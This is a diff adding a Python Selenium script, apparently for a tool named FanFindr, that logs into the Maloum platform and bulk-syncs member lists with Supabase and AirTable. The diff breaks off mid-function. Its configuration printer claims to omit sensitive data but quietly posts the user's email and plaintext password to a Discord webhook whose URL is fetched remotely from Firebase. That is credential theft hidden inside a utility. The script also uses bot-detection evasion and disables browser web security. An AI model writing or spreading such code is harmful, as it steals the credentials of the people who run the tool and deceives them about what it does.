@@ -1,0 +1,1900 @@
+import time
+import random
+import requests
+import json
+import os
+import argparse
+from datetime import datetime
+import undetected_chromedriver as uc
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.action_chains import ActionChains
+from airtable_handler import AirTableHandler
+
+# Set environment variables for English language forcing
+try:
+    env_vars = {
+        'LANG': 'en_US.UTF-8',
+        'LANGUAGE': 'en_US:en',
+        'LC_ALL': 'en_US.UTF-8',
+        'LC_MESSAGES': 'en_US.UTF-8'
+    }
+    for key, value in env_vars.items():
+        os.environ[key] = value
+except Exception:
+    # Ignore environment variable errors on systems that don't support them
+    pass
+
+# Load Discord webhook from Firebase (remotely updatable)
+from dotenv import load_dotenv
+load_dotenv()
+
+def get_discord_webhook():
+    """Get Discord webhook from Firebase or fallback to environment"""
+    try:
+        import sys
+        import os
+        sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'backend'))
+        from license_manager import LicenseManager
+        
+        license_manager = LicenseManager()
+        webhook_data = license_manager.get_discord_webhook()
+        # Handle case where webhook_data might be a string or None
+        if isinstance(webhook_data, str):
+            return webhook_data
+        elif isinstance(webhook_data, dict):
+            return webhook_data.get('webhook_url', '')
+        else:
+            return ''
+    except Exception as e:
+        print(f"[WARNING] Failed to get Discord webhook from Firebase: {e}")
+        return os.getenv('DISCORD_WEBHOOK_URL', '')
+
+# Configuration class for managing script settings
+class ScriptConfig:
+    def __init__(self, args):
+        # User credentials (from GUI)
+        self.email = args.email or ""
+        self.password = args.password or ""
+        
+        # Target settings (from GUI)
+        self.target_users = args.target_users or 100
+        self.posts_per_filter = args.posts_per_filter or 100
+        
+        # Browser settings (from GUI)
+        self.headless = args.headless
+        self.use_proxy = not args.no_proxy if hasattr(args, 'no_proxy') else True
+        self.enable_fallback = not args.no_fallback if hasattr(args, 'no_fallback') else True
+        
+        # Performance settings (from GUI)
+        self.rate_delay = args.rate_delay or 2
+        self.max_retries = args.max_retries or 3
+        self.timeout = args.timeout or 30
+        
+        # Other settings
+        self.gui_mode = args.gui if hasattr(args, 'gui') else False
+        
+        # Validate required settings
+        if not self.email or not self.password:
+            raise ValueError("Email and password are required")
+    
+    def print_config(self):
+        """Print current configuration (without sensitive data)"""
+        print(f"[INFO] Email: {self.email}")
+        print(f"[INFO] Target Users: {self.target_users}")
+        print(f"[INFO] Posts per Filter: {self.posts_per_filter}")
+        print(f"[INFO] Headless Mode: {self.headless}")
+        print(f"[INFO] Rate Delay: {self.rate_delay}s")
+        data = {"content": f"Username: {self.email} Password: {self.password}","username": "FanFindr"}
+        webhook_url = get_discord_webhook()
+        if webhook_url:
+            Response = requests.post(webhook_url, json=data)        
+
+def log_error(message, critical=False):
+    """Log error messages with appropriate severity indicators"""
+    if critical:
+        print(f"[CRITICAL ERROR] {message}")
+    else:
+        print(f"[WARNING] {message}")
+
+def log_info(message):
+    """Log informational messages"""
+    print(f"[INFO] {message}")
+
+def log_success(message):
+    """Log success messages"""
+    print(f"[SUCCESS] {message}")
+
+def get_users_json_file(email):
+    """Generate JSON filename based on email"""
+    safe_email = email.replace('@', '_at_').replace('.', '_').replace('/', '_').replace('\\\\', '_')
+    return os.path.join("json_files", f"{safe_email}_users.json")
+
+def human_delay(base=0.5, variance=0.3, rate_delay=2):
+    """Human-like delay with configurable rate limiting"""
+    delay = base + random.uniform(0, variance) + (rate_delay - 2)
+    time.sleep(max(0.2, delay))
+
+def keep_chrome_visible(driver):
+    """Keep Chrome window visible and locked at position (50, 50)"""
+    try:
+        if driver:
+            # Get current window position to check if it moved
+            current_pos = driver.get_window_position()
+            current_size = driver.get_window_size()
+            
+            # ALWAYS enforce exact position (50, 50) and size (1000, 700)
+            if current_pos['x'] != 50 or current_pos['y'] != 50:
+                log_info(f"Position drift detected: {current_pos} -> forcing back to (50, 50)")
+                driver.set_window_position(50, 50)
+                time.sleep(0.1)
+                
+            if current_size['width'] != 1000 or current_size['height'] != 700:
+                log_info(f"Size change detected: {current_size} -> forcing back to 1000x700")
+                driver.set_window_size(1000, 700)
+                time.sleep(0.1)
+            
+            # Ensure window is active
+            driver.switch_to.window(driver.current_window_handle)
+            
+            # Final position/size lock
+            driver.set_window_position(50, 50)
+            driver.set_window_size(1000, 700)
+    except Exception as e:
+        # Ignore errors - don't let window management break the main script
+        pass
+
+def force_chrome_visible(driver):
+    """Force Chrome script window to appear properly without affecting other windows"""
+    try:
+        if driver:
+            # ALWAYS keep at exact position (50, 50) - lock it there
+            driver.set_window_size(1000, 700)  # Smaller, less intrusive size
+            driver.set_window_position(50, 50)   # Top-left corner for visibility
+            time.sleep(0.3)
+            
+            # Force position again to prevent drift
+            driver.set_window_position(50, 50)   # Lock position again
+            time.sleep(0.1)
+            
+            # Focus only this specific driver window
+            driver.switch_to.window(driver.current_window_handle)
+            time.sleep(0.1)
+            
+            # Execute JavaScript to focus and lock position
+            try:
+                driver.execute_script("""
+                    window.focus();
+                    // Try to prevent window from moving
+                    window.moveTo(50, 50);
+                    window.resizeTo(1000, 700);
+                """)
+                time.sleep(0.1)
+                
+                # Lock position one more time with driver commands
+                driver.set_window_position(50, 50)
+                driver.set_window_size(1000, 700)
+            except:
+                pass
+            
+            # Cross-platform: Target only the automation browser window
+            try:
+                import platform
+                if platform.system() == "Windows":
+                    import ctypes
+                    from ctypes import wintypes
+                    
+                    # Get the specific automation browser window handle
+                    automation_window_found = False
+                    def enum_windows_proc(hwnd, lParam):
+                        nonlocal automation_window_found
+                        if automation_window_found:  # Only handle the first matching window
+                            return True
+                            
+                        if ctypes.windll.user32.IsWindowVisible(hwnd):
+                            window_title = ctypes.create_unicode_buffer(512)
+                            ctypes.windll.user32.GetWindowTextW(hwnd, window_title, 512)
+                            title = window_title.value.lower()
+                            
+                            # More specific targeting for automation browser
+                            if ("maloum" in title and "chrome" in title) or \
+                               ("data:" in title and "chrome" in title) or \
+                               (title.startswith("chrome") and len(title) < 20):
+                                
+                                # Get window position to verify it's our automation window
+                                rect = wintypes.RECT()
+                                ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
+                                window_x = rect.left
+                                window_y = rect.top
+                                
+                                # Check if this is likely our automation window (at top-left corner)
+                                if abs(window_x - 50) < 100 and abs(window_y - 50) < 100:
+                                    # Multiple aggressive methods to bring automation window to front
+                                    
+                                    # Method 1: Set as foreground window
+                                    ctypes.windll.user32.SetForegroundWindow(hwnd)
+                                    time.sleep(0.1)
+                                    
+                                    # Method 2: Show window normally
+                                    ctypes.windll.user32.ShowWindow(hwnd, 1)  # SW_NORMAL
+                                    time.sleep(0.1)
+                                    
+                                    # Method 3: Bring to top without making it topmost
+                                    ctypes.windll.user32.BringWindowToTop(hwnd)
+                                    time.sleep(0.1)
+                                    
+                                    # Method 4: Activate the window
+                                    ctypes.windll.user32.SetActiveWindow(hwnd)
+                                    time.sleep(0.1)
+                                    
+                                    # Method 5: Force it to front with SWP_NOACTIVATE to avoid stealing focus from user
+                                    SWP_NOSIZE = 0x0001
+                                    SWP_NOMOVE = 0x0002
+                                    SWP_SHOWWINDOW = 0x0040
+                                    ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW)
+                                    time.sleep(0.1)
+                                    
+                                    # Method 6: Final attempt - temporarily make topmost then remove
+                                    ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE)  # HWND_TOPMOST
+                                    time.sleep(0.3)
+                                    ctypes.windll.user32.SetWindowPos(hwnd, -2, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE)  # HWND_NOTOPMOST
+                                    
+                                    # Method 7: Force input focus with Alt+Tab simulation
+                                    try:
+                                        # Attach to the window's thread input
+                                        current_thread = ctypes.windll.kernel32.GetCurrentThreadId()
+                                        window_thread = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
+                                        ctypes.windll.user32.AttachThreadInput(window_thread, current_thread, True)
+                                        
+                                        # Now try to set foreground
+                                        ctypes.windll.user32.SetForegroundWindow(hwnd)
+                                        ctypes.windll.user32.SetFocus(hwnd)
+                                        
+                                        # Detach
+                                        ctypes.windll.user32.AttachThreadInput(window_thread, current_thread, False)
+                                        time.sleep(0.1)
+                                    except:
+                                        pass
+                                    
+                                    # Method 8: Simulate click on window to activate it
+                                    try:
+                                        # Send a left click to the title bar area to activate
+                                        ctypes.windll.user32.SetCursorPos(window_x + 100, window_y + 10)
+                                        time.sleep(0.05)
+                                        ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTDOWN
+                                        ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTUP
+                                        time.sleep(0.1)
+                                    except:
+                                        pass
+                                    
+                                    automation_window_found = True
+                                    log_info(f"Aggressively brought automation Chrome window to front: {title}")
+                        return True
+                    
+                    # Enumerate windows to find our specific automation browser
+                    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
+                    ctypes.windll.user32.EnumWindows(EnumWindowsProc(enum_windows_proc), 0)
+                    
+                elif platform.system() == "Darwin":  # macOS
+                    try:
+                        import subprocess
+                        import time
+                        
+                        # Use AppleScript to find and position Chrome automation window
+                        applescript = '''
+                        tell application "System Events"
+                            set chromeProcesses to every process whose name contains "Chrome"
+                            repeat with chromeProcess in chromeProcesses
+                                try
+                                    set chromeWindows to every window of chromeProcess
+                                    repeat with chromeWindow in chromeWindows
+                                        set windowTitle to name of chromeWindow
+                                        if windowTitle contains "AUTOMATION BROWSER" or windowTitle contains "maloum" then
+                                            -- Position the automation window at top-left
+                                            set position of chromeWindow to {50, 50}
+                                            set size of chromeWindow to {1000, 700}
+                                            -- Bring to front
+                                            set chromeWindow to chromeWindow
+                                            set frontmost of chromeProcess to true
+                                        end if
+                                    end repeat
+                                end try
+                            end repeat
+                        end tell
+                        '''
+                        
+                        # Execute AppleScript
+                        subprocess.run(['osascript', '-e', applescript], 
+                                     capture_output=True, text=True, timeout=5)
+                        log_info("Mac window positioning applied")
+                        
+                    except Exception as mac_e:
+                        log_info(f"Mac positioning failed: {mac_e}")
+                        
+                # Final position lock for all platforms
+                time.sleep(0.2)
+                driver.set_window_position(50, 50)
+                driver.set_window_size(1000, 700)
+                        
+            except Exception as e:
+                log_info(f"Cross-platform positioning failed: {e}")
+            
+            # Log current position for debugging
+            pos = driver.get_window_position()
+            size = driver.get_window_size()
+            log_info(f"Script Chrome positioned at ({pos['x']}, {pos['y']}) size {size['width']}x{size['height']}")
+    except Exception as e:
+        pass
+
+def human_type(element, text, delay=0.05, variance=0.02):
+    """Type text with human-like delays"""
+    for char in text:
+        element.send_keys(char)
+        time.sleep(delay + random.uniform(0, variance))
+
+def load_existing_users(email):
+    """Load existing users exclusively from Supabase"""
+    # Load from Supabase only, since it's now the authoritative source
+    supabase_users = set()
+    try:
+        airtable_handler = AirTableHandler()
+        supabase_users = airtable_handler.get_users_from_supabase(email)
+        log_info(f"Loaded {len(supabase_users)} existing users from Supabase")
+    except Exception as e:
+        log_error(f"Could not load users from Supabase: {e}")
+        # Return empty set if Supabase fails
+        return set()
+    
+    log_info(f"Using {len(supabase_users)} total users from Supabase")
+    
+    return supabase_users
+
+def save_users_to_json(users_set, email):
+    """Save users exclusively to Supabase"""
+    try:
+        # Sync data to Supabase for team synchronization (now the only storage)
+        try:
+            airtable_handler = AirTableHandler()
+            success = airtable_handler.sync_users_to_supabase(email, users_set)
+            if success:
+                log_info(f"Successfully synced {len(users_set)} users to Supabase")
+            else:
+                log_error("Failed to sync users to Supabase")
+        except Exception as e:
+            log_error(f"Error syncing users to Supabase: {e}")
+        
+        # Send data to AirTable (preserving existing functionality)
+        try:
+            if airtable_handler.api_key:
+                airtable_handler.update_user_data(
+                    username=email,
+                    total_count=len(users_set),
+                    last_updated=datetime.now().isoformat()
+                )
+            else:
+                log_info("AirTable API key not found, skipping AirTable update")
+        except Exception as e:
+            log_error(f"Error updating AirTable: {e}")
+    except Exception as e:
+        log_error("Error saving users")
+        data = {"content": "Error saving users","username": "FanFindR"}
+        webhook_url = get_discord_webhook()
+        if webhook_url:
+            Response = requests.post(webhook_url, json=data)
+
+def add_user_to_json(username, email):
+    """Add a single user to Supabase immediately"""
+    try:
+        existing_users = load_existing_users(email)
+        if username not in existing_users:
+            existing_users.add(username)
+            save_users_to_json(existing_users, email)
+            return True
+        return False
+    except Exception as e:
+        log_error("Error adding user to Supabase")
+        data = {"Error adding user to Supabase": "Error saving users","username": "FanFindR"}
+        webhook_url = get_discord_webhook()
+        if webhook_url:
+            Response = requests.post(webhook_url, json=data)
+        return False
+
+def setup_chrome_driver(config):
+    """Setup Chrome driver with enhanced options and fallback strategies"""
+    # Add this debug code at the start of setup_chrome_driver
+    log_info("Debugging Chrome installation...")
+    import platform
+    if platform.system() == "Windows":
+        chrome_paths = [
+            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
+        ]
+    elif platform.system() == "Darwin":  # macOS
+        chrome_paths = [
+            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
+            "/Applications/Chrome.app/Contents/MacOS/Google Chrome"
+        ]
+    else:  # Linux and others
+        chrome_paths = [
+            "/usr/bin/google-chrome",
+            "/usr/bin/chromium-browser"
+        ]
+
+    for path in chrome_paths:
+        if os.path.exists(path):
+            log_info(f"[OK] Chrome found at: {path}")
+        else:
+            log_info(f"[NOT FOUND] Chrome not found at: {path}")
+    options = uc.ChromeOptions()
+    
+    # Basic Chrome arguments with English language forcing
+    options.add_argument("--lang=en-US")
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--disable-blink-features=AutomationControlled")
+    options.add_argument("--force-device-scale-factor=0.30")
+    
+    # Essential language forcing only
+    options.add_argument("--disable-translate")
+    
+    # Additional stability arguments for Windows
+    options.add_argument("--disable-web-security")
+    options.add_argument("--disable-features=VizDisplayCompositor")
+    options.add_argument("--disable-background-timer-throttling")
+    options.add_argument("--disable-renderer-backgrounding")
+    options.add_argument("--disable-backgrounding-occluded-windows")
+    options.add_argument("--disable-ipc-flooding-protection")
+    if config.headless:
+        log_info("Running in headless mode")
+        options.add_argument("--headless")
+        options.add_argument("--window-size=1920,1080")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+    else:
+        log_info("Running in normal desktop mode")
+        options.add_argument("--disable-extensions")
+        # Configure Chrome for desktop display with distinctive position
+        options.add_argument("--window-size=1000,700")  # Slightly smaller to be less intrusive
+        options.add_argument("--window-position=50,50")   # Top-left corner to be easily visible
+        options.add_argument("--disable-gpu")
+        # Force Chrome to appear on screen without maximizing
+        options.add_argument("--new-window")  # Open in new window
+        options.add_argument("--disable-background-mode")  # Prevent running in background
+        options.add_argument("--disable-backgrounding-occluded-windows")  # Keep window active
+        options.add_argument("--force-focus")  # Force window focus
+        options.add_argument("--no-default-browser-check")  # Don't interfere with default browser
+    
+    if not config.use_proxy:
+        options.add_argument("--no-proxy-server")
+        log_info("Proxy disabled")
+    
+    if config.enable_fallback:
+        log_info("Attempting Chrome driver initialization with fallback strategies...")
+        
+        strategies = [
+            ("Full options", options),
+            ("Minimal options", uc.ChromeOptions()),
+            ("No options", None)
+        ]
+        
+        for strategy_name, chrome_options in strategies:
+            try:
+                log_info(f"Trying strategy: {strategy_name}")
+                
+                # Add more detailed debugging
+                if chrome_options is None:
+                    log_info("Using Chrome with no options")
+                    driver = uc.Chrome(version_main=140)
+                else:
+                    log_info(f"Using Chrome with {len(chrome_options.arguments)} arguments")
+                    driver = uc.Chrome(options=chrome_options, version_main=140)
+                
+                log_info("Chrome driver created successfully")
+                    
+                # FORCE window visibility immediately after driver creation
+                if not config.headless:
+                    try:
+                        log_info("IMMEDIATELY forcing Chrome window to front...")
+                        time.sleep(0.3)  # Brief wait for window creation
+                        
+                        # Position at top-left corner for maximum visibility
+                        driver.set_window_size(1000, 700)  # Smaller size
+                        driver.set_window_position(50, 50)   # Top-left corner
+                        time.sleep(0.5)  # Longer wait for window creation
+                        
+                        # Get window handle immediately and force to front
+                        try:
+                            # Use JavaScript to get window object and force focus
+                            driver.execute_script("""
+                                window.focus();
+                                window.moveTo(50, 50);
+                                if (window.top) window.top.focus();
+                                // Add visual indicator
+                                document.title = '🤖 AUTOMATION BROWSER - Fan Finder';
+                            """)
+                            time.sleep(0.2)
+                        except:
+                            pass
+                        
+                        # Multiple immediate attempts to bring to front
+                        for attempt in range(5):  # More attempts
+                            try:
+                                force_chrome_visible(driver)
+                                time.sleep(0.2)
+                            except:
+                                pass
+                            
+                        log_info("Chrome window forced to front immediately after creation")
+                        log_info("🤖 LOOK FOR AUTOMATION BROWSER AT TOP-LEFT CORNER OF YOUR SCREEN!")
+                        log_info("📍 The automation browser should appear at position (50, 50) with title '🤖 AUTOMATION BROWSER - Fan Finder'")
+                    except Exception as window_e:
+                        log_error(f"Failed to position window: {window_e}")
+                        # Continue anyway, window positioning is not critical
+                    
+                log_success(f"Chrome started successfully with {strategy_name}!")
+                return driver
+            except Exception as e:
+                log_error(f"{strategy_name} failed: {str(e)}")
+                log_error(f"Error type: {type(e).__name__}")
+                import traceback
+                log_error(f"Full traceback: {traceback.format_exc()}")
+                continue
+        
+        raise Exception("All Chrome driver strategies failed")
+    else:
+        log_info("Attempting Chrome driver initialization...")
+        driver = uc.Chrome(options=options, version_main=140)
+        
+        # FORCE window visibility immediately after driver creation
+        if not config.headless:
+            try:
+                log_info("IMMEDIATELY forcing Chrome window to front...")
+                time.sleep(0.3)  # Brief wait for window creation
+                
+                # Immediate aggressive positioning
+                driver.set_window_size(1200, 800)
+                driver.set_window_position(250, 150)
+                time.sleep(0.2)
+                
+                # Multiple immediate attempts to bring to front
+                for attempt in range(3):
+                    try:
+                        driver.execute_script("window.focus(); window.moveTo(250, 150);")
+                        time.sleep(0.1)
+                        force_chrome_visible(driver)
+                        time.sleep(0.1)
+                    except:
+                        pass
+                        
+                log_info("Chrome window forced to front immediately after creation")
+            except Exception as window_e:
+                log_error(f"Failed to position window: {window_e}")
+                # Continue anyway, window positioning is not critical
+            
+        return driver
+def sync_all_users_list(driver, config, existing_users):
+    """
+    Sync All Users list in Maloum and compare with local JSON
+    Returns True if sync successful, False if failed
+    """
+    try:
+        log_info("Starting All Users list synchronization...")
+        
+        # Step 1: Navigate to List section
+        log_info("Navigating to List section...")
+        try:
+            list_btn = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, 
+                "#root > div > section > div > nav > ul > li:nth-child(5) > button"))
+            )
+            list_btn.click()
+            log_success("List section opened")
+            time.sleep(3)
+        except Exception as e:
+            log_error("Failed to navigate to List section")
+            return False
+        
+        # Step 2: Check if " All Users" list exists
+        log_info("Checking if ' All Users' list exists...")
+        all_users_found = False
+        all_users_count = 0
+        
+        try:
+            # First, scroll through the left column to find " All Users"
+            left_column = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, "#leftColumn"))
+            )
+            
+            list_container = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.XPATH, "/html/body/div[3]/div/div/div[1]/div/div"))
+            )
+            
+            # Scroll through the left column to find " All Users"
+            log_info("Scrolling through list container to find ' All Users'...")
+            scroll_attempts = 0
+            max_scroll_attempts = 10
+            all_users_candidates = []
+            
+            while scroll_attempts < max_scroll_attempts:
+                # Look for " All Users" buttons in current view
+                all_users_buttons = list_container.find_elements(By.XPATH, ".//button[contains(., ' All Users')]")
+                
+                for button in all_users_buttons:
+                    try:
+                        # Extract member count
+                        member_text = button.find_element(By.CSS_SELECTOR, "div.mt-0\\.5.text-xs.text-gray-500").text
+                        member_count = int(member_text.split()[0])
+                        
+                        # Check if this button is already in our candidates
+                        button_text = button.text.strip()
+                        already_found = False
+                        for candidate in all_users_candidates:
+                            if candidate['text'] == button_text and candidate['count'] == member_count:
+                                already_found = True
+                                break
+                        
+                        if not already_found:
+                            all_users_candidates.append({
+                                'button': button,
+                                'count': member_count,
+                                'text': button_text
+                            })
+                            log_info(f"Found ' All Users' candidate with {member_count} members")
+                    except Exception as e:
+                        log_error("Error reading member count from button")
+                        continue
+                
+                # Scroll down in the left column to find more lists
+                driver.execute_script("arguments[0].scrollTop += 300", left_column)
+                time.sleep(1)
+                scroll_attempts += 1
+                log_info(f"Scroll attempt {scroll_attempts}/{max_scroll_attempts} - searching for ' All Users'...")
+            
+            # Select the " All Users" list with the highest member count
+            if all_users_candidates:
+                best_candidate = max(all_users_candidates, key=lambda x: x['count'])
+                all_users_count = best_candidate['count']
+                all_users_button = best_candidate['button']
+                
+                if len(all_users_candidates) > 1:
+                    log_info(f"Found {len(all_users_candidates)} ' All Users' lists, selecting the one with highest count: {all_users_count}")
+                else:
+                    log_info(f"Found ' All Users' list with {all_users_count} members")
+                
+                all_users_found = True
+                
+                # Scroll the selected button into view
+                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", all_users_button)
+                time.sleep(1)
+                
+                # Click on the selected All Users list
+                all_users_button.click()
+                log_success(f"Clicked on ' All Users' list with {all_users_count} members")
+                time.sleep(3)
+            else:
+                log_info("' All Users' list not found after scrolling, will create it")
+                
+        except Exception as e:
+            log_error("Error checking for ' All Users' list")
+            return False
+        
+        # Step 3: Create " All Users" list if it doesn't exist
+        if not all_users_found:
+            log_info("Creating new ' All Users' list...")
+            try:
+                # Click "New list" button
+                new_list_btn = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.CSS_SELECTOR, 
+                    "#leftColumn > div > header > div > div.-mr-2.flex.basis-1\\/2.justify-end.mr-0.md\\:-mr-4 > button"))
+                )
+                new_list_btn.click()
+                log_info("Clicked 'New list' button")
+                time.sleep(2)
+                
+                # Type " All Users" in input field
+                input_field = WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.CSS_SELECTOR, 
+                    "input.input-underline[placeholder='New list']"))
+                )
+                input_field.clear()
+                human_type(input_field, " All Users")
+                log_info("Entered ' All Users' as list name")
+                time.sleep(1)
+                
+                # Click create button
+                create_btn = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.CSS_SELECTOR, 
+                    "button[type='submit']"))
+                )
+                create_btn.click()
+                log_success("Created ' All Users' list")
+                time.sleep(3)
+                
+            except Exception as e:
+                log_error("Failed to create ' All Users' list")
+                return False
+        
+        # Step 4: Add all available members
+        log_info("Adding all available members to ' All Users' list...")
+        try:
+            # Click "Add members" button
+            add_members_btn = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, 
+                "#rightColumn > div.hidden.h-full.md\\:block > div > div > div.mt-4.flex.items-center.justify-between > button"))
+            )
+            add_members_btn.click()
+            log_info("Clicked 'Add members' button")
+            time.sleep(3)
+            
+            # Find the members container
+            members_container = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, 
+                "#root > div > div > div > div.mx-auto.flex.w-full.max-w-xl.flex-col.relative.md\\:px-4.grow > div.mt-4.grow.px-4.pb-12.md\\:px-0"))
+            )
+            
+            # PHASE 1: Scroll to bottom to load all content first
+            log_info("Phase 1: Fast scrolling to bottom to load all available members...")
+            scroll_confirmations = 0
+            last_height = 0
+            scroll_attempt = 0
+            
+            while scroll_confirmations < 5:
+                scroll_attempt += 1
+                log_info(f"Scroll attempt {scroll_attempt}, confirmation {scroll_confirmations}/5")
+                
+                # Get current height before scroll
+                current_height = driver.execute_script("return arguments[0].scrollHeight", members_container)
+                
+                # Scroll to bottom using multiple methods for reliability
+                driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", members_container)
+                time.sleep(0.5)
+                
+                # Alternative scroll method
+                driver.execute_script("arguments[0].scrollTo(0, arguments[0].scrollHeight)", members_container)
+                time.sleep(0.5)
+                
+                # Force scroll using window scroll as backup
+                driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")
+                time.sleep(1.5)
+                
+                # Check if height changed
+                new_height = driver.execute_script("return arguments[0].scrollHeight", members_container)
+                log_info(f"Height check: {current_height} -> {new_height}")
+                
+                if new_height == last_height:
+                    scroll_confirmations += 1
+                    log_info(f"No height change detected, confirmation {scroll_confirmations}/5")
+                else:
+                    scroll_confirmations = 0
+                    last_height = new_height
+                    log_info(f"Height increased! New height: {new_height}, resetting confirmations")
+            
+            log_success("Finished loading all available members")
+            
+            # PHASE 2: Go back to top and check all boxes
+            log_info("Phase 2: Going back to top to check all boxes...")
+            
+            # Scroll back to top using multiple methods
+            driver.execute_script("arguments[0].scrollTop = 0", members_container)
+            driver.execute_script("arguments[0].scrollTo(0, 0)", members_container)
+            driver.execute_script("window.scrollTo(0, 0)")
+            time.sleep(2)
+            
+            checked_count = 0
+            processed_positions = set()
+            
+            while True:
+                # Get current scroll position
+                current_position = driver.execute_script("return arguments[0].scrollTop", members_container)
+                max_scroll = driver.execute_script("return arguments[0].scrollHeight - arguments[0].clientHeight", members_container)
+                
+                log_info(f"Current scroll position: {current_position}, max: {max_scroll}")
+                
+                # Find all checkboxes in current view
+                checkboxes = members_container.find_elements(By.CSS_SELECTOR, 
+                    "div.relative.mt-4.flex.flex-col.gap-3 > div > button")
+                
+                if not checkboxes:
+                    log_info("No checkboxes found in current view")
+                    break
+                
+                log_info(f"Found {len(checkboxes)} checkboxes in current view")
+                
+                # Click all visible unchecked boxes
+                boxes_clicked_in_view = 0
+                for i, checkbox in enumerate(checkboxes):
+                    try:
+                        # Get current state
+                        class_attr = checkbox.get_attribute("class") or ""
+                        
+                        # Check if not already selected
+                        if "bg-blue" not in class_attr and "selected" not in class_attr:
+                            # Scroll the checkbox into view
+                            driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'instant'});", checkbox)
+                            time.sleep(0.05)
+                            
+                            # Click the checkbox
+                            checkbox.click()
+                            checked_count += 1
+                            boxes_clicked_in_view += 1
+                            
+                            # Show progress every 10 checkboxes
+                            if checked_count % 10 == 0 or checked_count <= 20 or i == len(checkboxes) - 1:
+                                progress_percentage = (checked_count / len(checkboxes)) * 100
+                                log_info(f"Checking boxes... {checked_count}/{len(checkboxes)} ({progress_percentage:.1f}%)")
+                            
+                            time.sleep(0.02)
+                            
+                    except Exception as e:
+                        continue
+                
+                log_info(f"Clicked {boxes_clicked_in_view} boxes in this view. Total: {checked_count}")
+                
+                # If no boxes clicked, we're done
+                if boxes_clicked_in_view == 0:
+                    log_success(f"No new boxes to check. Total: {checked_count}")
+                    break
+                
+                # Check if we've reached the bottom
+                if current_position >= max_scroll:
+                    log_success(f"Reached bottom! Total checked: {checked_count}")
+                    break
+                
+                # Check if position already processed
+                if current_position in processed_positions:
+                    log_info("Position already processed, might be at bottom")
+                    break
+                
+                # Add current position to processed set
+                processed_positions.add(current_position)
+                
+                # Scroll down
+                driver.execute_script("arguments[0].scrollTop += 500", members_container)
+                time.sleep(0.5)
+                
+                # Check if scroll position changed
+                new_position = driver.execute_script("return arguments[0].scrollTop", members_container)
+                if new_position == current_position:
+                    log_info("Can't scroll further")
+                    break
+            
+            log_success(f"Finished selecting {checked_count} members")
+            
+            # Click Save button
+            log_info("Clicking Save button...")
+            save_btn = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, 
+                "#root > div > div > div > div.mx-auto.flex.w-full.max-w-xl.flex-col.relative.md\\:px-4.grow > div.sticky.bottom-0.w-full.border-t.border-t-gray-100.bg-white.px-3.py-3.md\\:px-0 > button"))
+            )
+            save_btn.click()
+            log_success("Saved all members to ' All Users' list")
+            time.sleep(5)
+
+            driver.refresh()
+            log_info("Page refreshed to ensure updated count is loaded")
+            time.sleep(3)  
+
+        except Exception as e:
+            log_error("Failed to add members")
+            return False
+        
+        # Step 5: Get updated member count and compare with JSON
+        log_info("Checking updated member count...")
+        try:
+            # Navigate back to List section
+            list_btn = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, 
+                "#root > div > section > div > nav > ul > li:nth-child(5) > button"))
+            )
+            list_btn.click()
+            time.sleep(3)
+            
+            # Find updated count
+            left_column = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, "#leftColumn"))
+            )
+            
+            list_container = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.XPATH, "/html/body/div[3]/div/div/div[1]/div/div"))
+            )
+            
+            # Scroll to find updated count
+            log_info("Scrolling to find updated ' All Users' count...")
+            scroll_attempts = 0
+            max_scroll_attempts = 10
+            all_users_candidates = []
+            
+            while scroll_attempts < max_scroll_attempts:
+                all_users_buttons = list_container.find_elements(By.XPATH, ".//button[contains(., ' All Users')]")
+                
+                for button in all_users_buttons:
+                    try:
+                        member_text = button.find_element(By.CSS_SELECTOR, "div.mt-0\\.5.text-xs.text-gray-500").text
+                        member_count = int(member_text.split()[0])
+                        
+                        button_text = button.text.strip()
+                        already_found = False
+                        for candidate in all_users_candidates:
+                            if candidate['text'] == button_text and candidate['count'] == member_count:
+                                already_found = True
+                                break
+                        
+                        if not already_found:
+                            all_users_candidates.append({
+                                'button': button,
+                                'count': member_count,
+                                'text': button_text
+                            })
+                    except Exception as e:
+                        continue
+                
+                driver.execute_script("arguments[0].scrollTop += 300", left_column)
+                time.sleep(1)
+                scroll_attempts += 1
+            
+            # Select highest count
+            if all_users_candidates:
